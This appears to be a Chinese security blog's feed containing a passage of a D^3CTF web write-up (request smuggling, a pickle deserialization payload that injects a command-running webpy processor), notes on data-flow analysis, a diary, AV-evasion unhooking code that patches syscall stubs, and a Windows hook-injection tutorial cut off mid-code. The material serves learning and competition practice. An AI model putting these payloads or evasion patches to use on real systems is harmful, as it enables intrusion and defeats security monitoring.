class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-stylus"><span class="selector-tag">b</span></span></span><br><span class="line"><span class="language-stylus">q=smuggling</span></span><br><span class="line"><span class="language-stylus"><span class="number">6</span></span></span><br><span class="line"><span class="language-stylus">hahaha</span></span><br><span class="line"><span class="language-stylus"><span class="number">0</span></span></span><br><span class="line"><span class="language-stylus"><span class="selector-attr">[空白行]</span></span></span><br><span class="line"><span class="language-stylus"><span class="selector-attr">[空白行]</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\nHost: 1.com\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\nb\r\nq=smuggling\r\n6\r\nhahaha\r\n0\r\n\r\n</span><br></pre></td></tr></table></figure><h4 id="webpy下的内存马"><a href="#webpy下的内存马" class="headerlink" title="webpy下的内存马"></a>webpy下的内存马</h4><p>算是第一次碰到这个框架</p><p>查看源码，可以发现有<code>processors</code>的变量，类似于一个<code>filter</code>的用法</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021653498.png" alt="image-20240502164858824"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021653263.png" alt="image-20240502165248494"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021653911.png" alt="image-20240502165332488"></p><p>生成opcode，添加一个Processor进去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>, (<span class="string">&quot;app.add_processor((lambda self : __import__(&#x27;os&#x27;).popen(&#x27;cat /home/ctf/flag&#x27;).read()))&quot;</span>,)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">exp = exploit()</span><br><span class="line">exp_str = pickle.dumps(exp, protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(exp_str))</span><br></pre></td></tr></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>感觉使用bp很容易出问题，所以想方设法使用脚本发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247485683&idx=1&sn=59a3ab77c368f4a06173f06ba6acc8f4&chksm=cf5ee8a5f82961b3369d0442ef2b09e0c09133192349b7d76f1c829458cb0c66aed0723b4a40&mpshare=1&scene=23&srcid=05027by9GN73PBRo2Fb8sIO9&sharer_shareinfo=e4946fbe5ac0cfc0ad85a20ab1ae04a3&sharer_shareinfo_first=e4946fbe5ac0cfc0ad85a20ab1ae04a3#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247485683&amp;idx=1&amp;sn=59a3ab77c368f4a06173f06ba6acc8f4&amp;chksm=cf5ee8a5f82961b3369d0442ef2b09e0c09133192349b7d76f1c829458cb0c66aed0723b4a40&amp;mpshare=1&amp;scene=23&amp;srcid=05027by9GN73PBRo2Fb8sIO9&amp;sharer_shareinfo=e4946fbe5ac0cfc0ad85a20ab1ae04a3&amp;sharer_shareinfo_first=e4946fbe5ac0cfc0ad85a20ab1ae04a3#rd</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024-D-3CTF-Web-WP和复现&quot;&gt;&lt;a href=&quot;#2024-D-3CTF-Web-WP和复现&quot; class=&quot;headerlink&quot; title=&quot;2024-D^3CTF-Web-WP和复现&quot;&gt;&lt;/a&gt;2024-D^3CTF-Web-WP和复现&lt;/</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>NJU-Static-Analysis-Data-Flow-Analysis-2</title>
    <link href="http://example.com/2024/05/01/NJU-Static-Analysis-Data-Flow-Analysis-2/"/>
    <id>http://example.com/2024/05/01/NJU-Static-Analysis-Data-Flow-Analysis-2/</id>
    <published>2024-05-01T12:09:24.000Z</published>
    <updated>2024-05-03T05:42:32.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NJU-Static-Analysis-Data-Flow-Analysis-2"><a href="#NJU-Static-Analysis-Data-Flow-Analysis-2" class="headerlink" title="NJU-Static-Analysis-Data-Flow-Analysis-2"></a>NJU-Static-Analysis-Data-Flow-Analysis-2</h1><h2 id="Live-Variables-Analysis"><a href="#Live-Variables-Analysis" class="headerlink" title="Live Variables Analysis"></a>Live Variables Analysis</h2><h3 id="Live-Variables-定义"><a href="#Live-Variables-定义" class="headerlink" title="Live Variables 定义"></a>Live Variables 定义</h3><p>活跃变量（Live Variables）：</p><blockquote><p><strong>程序点p处的变量v是活变量</strong>，当且仅当在CFG中存在某条从p开始的路径，在这条路径上变量v被使用了，且在使用前未被重定义（但是不要求v在p之前必须被定义到）</p></blockquote><blockquote><p>可应用于寄存器分配（Register Allocation），可以作为编译器优化的参考信息。比如说，如果在某个程序点处，所有的寄存器都被占满了，而我们又需要用一个新的寄存器，那么我们就要从已经占满的这些寄存器中选择一个去覆盖它的旧值，我们应该更青睐于去覆盖那些储存死变量的寄存器。</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012223818.png" alt="image-20240501203950973"></p><h3 id="使用bit-vector来表示活跃变量中的数据流值"><a href="#使用bit-vector来表示活跃变量中的数据流值" class="headerlink" title="使用bit vector来表示活跃变量中的数据流值"></a>使用bit vector来表示活跃变量中的数据流值</h3><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012223514.png" alt="image-20240501205202538"></p><p>​$V_i &#x3D; 1$表示$i$对应的变量为活跃变量</p><h3 id="Transfer-function和control-flow"><a href="#Transfer-function和control-flow" class="headerlink" title="Transfer function和control flow"></a>Transfer function和control flow</h3><ul><li>一个例子：</li></ul><p>​主要是理解活跃变量的定义：</p><blockquote><p>redefine之前进行use</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012220468.png" alt="image-20240501221715873"></p><p>​4的那种情况可以拆解成先use再redefine</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012220471.png" alt="image-20240501222000204"></p><ul><li>所以归纳出公式</li></ul><p>$use_B$ 指在Basic Block $B$中在redefine之前use到的变量，在其对应的bit vector位置上记为1</p><p>$def_B$ 指在Basic Block $B$中在redefine对应的变量上，bit vector置为1，并为kill操作做准备</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012223257.png" alt="image-20240501221649741"></p><h3 id="活跃变量分析算法"><a href="#活跃变量分析算法" class="headerlink" title="活跃变量分析算法"></a>活跃变量分析算法</h3><p>​也是一个Iteration的算法，所以开头的初始化按照模板来走，分成了两部分</p><p>​接下来就是对每个$OUT[B]$和$IN[S]$的声明了</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012223890.png" alt="image-20240501220925383"></p><p>​例子详情见ppt，讲得很通俗易懂</p><h2 id="Available-Expression-Analysis"><a href="#Available-Expression-Analysis" class="headerlink" title="Available Expression Analysis"></a>Available Expression Analysis</h2><h3 id="Available-Expression-定义"><a href="#Available-Expression-定义" class="headerlink" title="Available Expression 定义"></a>Available Expression 定义</h3><p>可用表达式分析（Available Expression）：</p><blockquote><p>表达式<code>x op y</code>在程序点<code>p</code>是可用的 &lt;&#x3D;&gt; </p><ul><li><strong>所有</strong>程序入口点到程序点p的路径都必须经过<code>x op y</code>表达式的<code>Evaluation</code></li><li>在最后一次<code>x op y</code>的评估之后，没有<code>x</code>或者<code>y</code>的重定义</li></ul><p>对于程序中每个程序点处的可用表达式分析，称之为 可用表达式分析（Available Expression Analysis）</p></blockquote><p>available expression是一种优化层次上的数据流分析对象，由于是优化，不可错报可以漏报，是一种must analysis。</p><p>考虑如下这个例子：</p><p>在1处定义了一个表达式，其中的表达式为$e^{16}*x$，在$BB_2$后，即使先对$x$进行重定义，但是之后仍旧使用了$b &#x3D; e^{16} * x$，因此$b &#x3D; e^{16} * x$仍旧是available，最后让两条edge上的PP做交，可以得到汇入$BB_3$的表达式状态</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405031241038.png" alt="image-20240503123329295"></p><h3 id="Transfer-function和control-flow-1"><a href="#Transfer-function和control-flow-1" class="headerlink" title="Transfer function和control flow"></a>Transfer function和control flow</h3><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405031253952.png" alt="image-20240503124319536"></p><h3 id="可用表达式的分析算法"><a href="#可用表达式的分析算法" class="headerlink" title="可用表达式的分析算法"></a>可用表达式的分析算法</h3><p>值得注意的点如下：</p><ul><li><p>整个算法在控制流图中的分析方向：从entry自顶向下按顺序分析，入口点处的$OUT[entry]&#x3D;null$</p></li><li><p>对于其他PP处的$OUT[B]$设置为全1</p></li><li><p>在控制流汇聚的时候，对于$OUT[B]$的处理需要做interaction，作为下一个$BB$的输入</p></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405031252691.png" alt="image-20240503124402882"></p><h2 id="三种数据流分析的比较"><a href="#三种数据流分析的比较" class="headerlink" title="三种数据流分析的比较"></a>三种数据流分析的比较</h2><p>这里重点回顾下 <strong>到达定值分析</strong> 和 <strong>活跃变量分析</strong>，感觉这两个分析对象很容易混淆</p><ul><li>到达定值分析和活跃变量分析都是以并集作为交汇运算，我们主要关心的是其中一条路径上是否满足我们所想要的性质，而不关心所有路径</li><li>活跃变量分析是逆向遍历的（从exit为分析入口点，与控制流方向相反），且针对的是某个变量，关注的是程序点p上的对变量x的使用可以被传递到在某个执行路径中p之前的所有程序点。</li><li>到达定值分析，正向分析，针对的是definition，我们关注的是程序点p上的definition对于x的定义是否可以传播到某条执行路径中的且在p之后的程序点。</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405012220468.png"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404302223446.png" alt="image-20240430220521445"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405031256976.png" alt="image-20240503125613247"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NJU-Static-Analysis-Data-Flow-Analysis-2&quot;&gt;&lt;a href=&quot;#NJU-Static-Analysis-Data-Flow-Analysis-2&quot; class=&quot;headerlink&quot; title=&quot;NJU-Static-A</summary>
      
    
    
    
    
    <category term="Static Analysis" scheme="http://example.com/tags/Static-Analysis/"/>
    
  </entry>
  
  <entry>
    <title>我的2024年四月</title>
    <link href="http://example.com/2024/04/21/diary-2024-04-21/"/>
    <id>http://example.com/2024/04/21/diary-2024-04-21/</id>
    <published>2024-04-21T14:13:30.000Z</published>
    <updated>2024-05-01T14:31:42.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="日记"><a href="#日记" class="headerlink" title="日记"></a>日记</h1><h1 id="四月-の-小记"><a href="#四月-の-小记" class="headerlink" title="四月 の 小记"></a>四月 の 小记</h1><p>四月，又称为清和月，既没有冬雪的凛冽，也没有夏日的炎热，自有清爽和气之感</p><h2 id="2024-04-04-–-武汉：🌸和藕的城市"><a href="#2024-04-04-–-武汉：🌸和藕的城市" class="headerlink" title="2024.04.04 – 武汉：🌸和藕的城市"></a>2024.04.04 – 武汉：🌸和藕的城市</h2><p> 武汉，其实之前就很想去了，因为武汉这座城市在我的记忆里是以樱花落雨的画面出现的</p><p>欲买桂花同载酒，终不似，少年游。</p><p>作为南方人，我很喜欢那种雨后那种潮湿的空气充斥肺腑的清爽感，于是少年也很喜欢在长江大桥上吹吹江风</p><p>我的学校附近没有夜市，所以自然而然，武汉的夜市都会给我一种明亮和新鲜的感觉</p><p>我想我以后也喜欢那种下完班或者夜晚和喜欢的人出来散步之后还能有淀粉肠、烤面筋小摊的城市叭</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212244883.jpg" alt="IMG_20240404_185710"></p><p>清明雨落，樱花亦落，武大的樱花算是没看到了，人看人可还行，打卡了武大的几个景点</p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212329144.jpg" alt="IMG_20240405_130328_edit_696557426445274" style="zoom: 50%;" /><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212329533.jpg" alt="IMG_20240405_143225" style="zoom: 50%;" /><p>后面还去了黄鹤楼，的楼下，以及citywalk…</p><h2 id="2024-04-13-–-HASHCTF：做出题人，收获颇丰"><a href="#2024-04-13-–-HASHCTF：做出题人，收获颇丰" class="headerlink" title="2024.04.13 – HASHCTF：做出题人，收获颇丰"></a>2024.04.13 – HASHCTF：做出题人，收获颇丰</h2><p>第一次以主要出题人的身份，自己算是很认真的对待这次出题了，自己调了好久的程序，可惜还是没处理好dockerfile，被打了非预期，还是太菜了www，感谢大家的理解和对比赛的支持</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327900.png" alt="image-20240421231157944"></p><h2 id="2024-04-21-–-天津：awd和渗透，web🐕猪脑过载了"><a href="#2024-04-21-–-天津：awd和渗透，web🐕猪脑过载了" class="headerlink" title="2024.04.21 – 天津：awd和渗透，web🐕猪脑过载了"></a>2024.04.21 – 天津：awd和渗透，web🐕猪脑过载了</h2><p>来程高铁上拍的，有点故乡の原风景那味了hhh</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327850.jpg" alt="IMG_20240420_101422"></p><p>​打完长城杯天津的线下赛，第一次打线下awd和第二次打线下渗透赛 … 整支队伍里只有我一个web手，幸好队里还有个misc大爹，算是一个人扛多台靶机哈哈哈，有点猪脑过载的感觉。</p><p>​感谢学校出了差旅费，第一次住五星级酒店（土狗抬头望望），回酒店浴缸里泡了个澡，</p><p>​最后水水拿了个二等</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327842.jpg" alt="IMG_20240421_165339"></p><p>​铁三，永远的第一届</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327055.jpg" alt="IMG_20240420_160713"></p><p>​</p><blockquote><p>喜报：进决赛了诶😊</p></blockquote><h2 id="2024-04-21-2024-04-30-–-期中考：我和你势不两立"><a href="#2024-04-21-2024-04-30-–-期中考：我和你势不两立" class="headerlink" title="2024.04.21 - 2024.04.30 – 期中考：我和你势不两立"></a>2024.04.21 - 2024.04.30 – 期中考：我和你势不两立</h2><p>感觉上学越上越久，觉得在学校里，无非只是能更为自由地支配自己学习的时间罢了</p><p>至于学什么，我觉得还是得靠自己的主动性</p><p>以及课上的东西，压根不够，更何况是密码课程居多的学院呢</p><blockquote><p>所以，呜呜呜我好菜学不完了，期中考啥都不会</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404212327291.png" alt="image-20240421232708658"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;日记&quot;&gt;&lt;a href=&quot;#日记&quot; class=&quot;headerlink&quot; title=&quot;日记&quot;&gt;&lt;/a&gt;日记&lt;/h1&gt;&lt;h1 id=&quot;四月-の-小记&quot;&gt;&lt;a href=&quot;#四月-の-小记&quot; class=&quot;headerlink&quot; title=&quot;四月 の 小记&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="life" scheme="http://example.com/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>免杀中的unhook手法(持续更新)</title>
    <link href="http://example.com/2024/04/15/unhook_AVBypass/"/>
    <id>http://example.com/2024/04/15/unhook_AVBypass/</id>
    <published>2024-04-15T10:46:23.000Z</published>
    <updated>2024-04-15T14:42:01.048Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UnhookingPatch"><a href="#UnhookingPatch" class="headerlink" title="UnhookingPatch"></a>UnhookingPatch</h1><p>项目地址：<a href="https://github.com/SaadAhla/UnhookingPatch">https://github.com/SaadAhla/UnhookingPatch</a></p><p>通过syscall stub来判断是否被hook</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">isItHooked</span><span class="params">(LPVOID addr)</span> </span>&#123;</span><br><span class="line">    BYTE stub[] = <span class="string">&quot;\x4c\x8b\xd1\xb8&quot;</span>;          </span><br><span class="line">    <span class="comment">// syscall stub:</span></span><br><span class="line">    <span class="comment">// mov r10, rcx</span></span><br><span class="line">    <span class="comment">// mov eax</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(addr, stub, <span class="number">4</span>) != <span class="number">0</span>) </span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unhook的手法，修改内存页属性，将patch内容写入内存，恢复内存页</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookPatch</span><span class="params">(LPVOID addr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD oldprotect = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">    BYTE syscallNum = <span class="built_in">GetsyscallNum</span>(addr);</span><br><span class="line">    DWORD64 syscallInst = <span class="built_in">GetsyscallInstr</span>(addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// mov     r10, rcx        </span></span><br><span class="line">    <span class="comment">// mov     eax, SSN</span></span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    <span class="comment">// retn</span></span><br><span class="line"></span><br><span class="line">    BYTE patch[] = &#123; <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xCA</span>, <span class="number">0xB8</span>, <span class="number">0xBC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0xC3</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    patch[<span class="number">4</span>] = syscallNum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// syscall instruction</span></span><br><span class="line">    patch[<span class="number">8</span>] = *(BYTE*)syscallInst;</span><br><span class="line">    patch[<span class="number">9</span>] = *(BYTE*)(syscallInst + <span class="number">0x1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 addr 指向的内存页的保护属性设置为可执行、可读写，并将原始的保护属性值存储到 oldprotect 变量中，以便将来恢复原始的保护属性</span></span><br><span class="line">    BOOL status1 = <span class="built_in">VirtualProtect</span>(addr, <span class="number">4096</span>, PAGE_EXECUTE_READWRITE, &amp;oldprotect);</span><br><span class="line">    <span class="keyword">if</span> (!status1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed in changing protection (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(addr, patch, <span class="built_in">sizeof</span>(patch));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 恢复</span></span><br><span class="line">    BOOL status2 = <span class="built_in">VirtualProtect</span>(addr, <span class="number">4096</span>, oldprotect, &amp;oldprotect);</span><br><span class="line">    <span class="keyword">if</span> (!status2) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed in changing protection back (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="LdrLoadDll-Unhooking"><a href="#LdrLoadDll-Unhooking" class="headerlink" title="LdrLoadDll-Unhooking"></a>LdrLoadDll-Unhooking</h1><p>项目地址：<a href="https://github.com/trickster0/LdrLoadDll-Unhooking">https://github.com/trickster0/LdrLoadDll-Unhooking</a></p><p>上个项目的思路就是直接修改内存中数据然后patch掉</p><p>这个项目的思路：实际上是做一个跳板函数绕过hook</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404152101165.png" alt="image-20240415210111729"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://killer.wtf/2022/01/19/CustomJmpUnhook.html">https://killer.wtf/2022/01/19/CustomJmpUnhook.html</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UnhookingPatch&quot;&gt;&lt;a href=&quot;#UnhookingPatch&quot; class=&quot;headerlink&quot; title=&quot;UnhookingPatch&quot;&gt;&lt;/a&gt;UnhookingPatch&lt;/h1&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://</summary>
      
    
    
    
    
    <category term="RedTeam" scheme="http://example.com/tags/RedTeam/"/>
    
  </entry>
  
  <entry>
    <title>Windows Hacker Review - 注入技术</title>
    <link href="http://example.com/2024/04/10/WindowsHacker-InjectionTrick/"/>
    <id>http://example.com/2024/04/10/WindowsHacker-InjectionTrick/</id>
    <published>2024-04-10T13:21:18.000Z</published>
    <updated>2024-04-10T13:29:18.992Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>寒假的时候写的，4月才发现没有发到博客：(</p></blockquote><h1 id="Windows注入技术-复现"><a href="#Windows注入技术-复现" class="headerlink" title="Windows注入技术 复现"></a>Windows注入技术 复现</h1><p>对于《Windows黑客编程》一书中的各种注入技术进行复现和总结</p><p>环境：</p><ul><li>OS：windows10</li><li>IDE：Visual Studio 2022</li></ul><h2 id="全局钩子注入"><a href="#全局钩子注入" class="headerlink" title="全局钩子注入"></a>全局钩子注入</h2><p>Windows中的大部分应用程序依赖于消息机制，其中含有消息过程函数，而Windows操作系统的钩子机制用于截获和监视系统中的消息。</p><p>依据钩子的作用范围，可以分为局部钩子和全局钩子：</p><ul><li>局部钩子：针对某个线程</li><li>全局钩子：作用于整个系统的消息</li></ul><h3 id="WinAPI介绍"><a href="#WinAPI介绍" class="headerlink" title="WinAPI介绍"></a>WinAPI介绍</h3><p>关于全局钩子注入Win32 API介绍：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HHOOK WINAPI SetWindowsHookEx&#123;</span><br><span class="line">    _In_ <span class="type">int</span> idHook,<span class="comment">// 钩子程序类型</span></span><br><span class="line">    _In_ HOOKPROC lpfn,<span class="comment">// 指向钩子程序的函数指针</span></span><br><span class="line">    _In_ HINSTANCE hMod,<span class="comment">// 已加载的DLL或EXE实例的句柄，HMODULE句柄是通过LoadLibrary或GetModuleHandle等函数加载模块时返回</span></span><br><span class="line">    _In_ DWORD dwThreadId<span class="comment">// 与钩子相关的线程标识符，如果参数为0表示与系统中所有线程相关联</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回值:</span></span><br><span class="line"><span class="comment">// 设置成功则返回钩子过程的句柄</span></span><br><span class="line"><span class="comment">// 设置失败则返回值为NULL</span></span><br></pre></td></tr></table></figure><p>将程序定义的钩子函数（<code>HOOKPROC lpfn</code>）安装到挂钩链中，安装钩子程序可以监视系统是否存在某些类型的事件，这些事件与特定线程或调用线程所在桌面中的所有线程相关联</p><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><h4 id="生成DLL文件"><a href="#生成DLL文件" class="headerlink" title="生成DLL文件"></a>生成DLL文件</h4><p>新建一个DLL空项目</p><p>预编译头pch.h中设置</p><blockquote><p>该文件是预编译标头文件，仅仅编译一次</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PCH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCH_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加要在此处预编译的标头</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="comment">// 设置钩子函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">SetHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 钩子回调函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function">LRESULT <span class="title">GetMsgProc</span><span class="params">(<span class="type">int</span> code, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="comment">// 卸载钩子函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function">BOOL <span class="title">UnsetHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//PCH_H</span></span></span><br></pre></td></tr></table></figure><p>在pch.cpp文件中实现上述函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pch.cpp: 与预编译标头对应的源文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当使用预编译的头时，需要使用此源文件，编译才能成功。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> HMODULE g_hDllModule;<span class="comment">// 已经加载的DLL的句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 